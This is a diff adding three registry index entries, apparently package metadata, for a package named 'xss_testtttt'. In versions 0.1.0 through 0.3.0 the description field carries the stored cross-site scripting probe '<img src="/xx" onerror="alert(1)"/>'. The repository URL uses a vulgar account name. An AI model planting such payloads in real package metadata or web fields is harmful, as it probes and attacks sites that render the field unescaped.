@@ -1,0 +1,3 @@
+{"name":"xss_testtttt","desc":"<img src=\"/xx\" onerror=\"alert(1)\"/>","repo":"https://github.com/GithubIsACocksucker/xss-deno-test","reg":"x","vers":"0.1.0"}
+{"name":"xss_testtttt","desc":"<img src=\"/xx\" onerror=\"alert(1)\"/>","repo":"https://github.com/GithubIsACocksucker/xss-deno-test","reg":"x","vers":"0.2.0"}
+{"name":"xss_testtttt","desc":"<img src=\"/xx\" onerror=\"alert(1)\"/>","repo":"https://github.com/GithubIsACocksucker/xss-deno-test","reg":"x","vers":"0.3.0"}
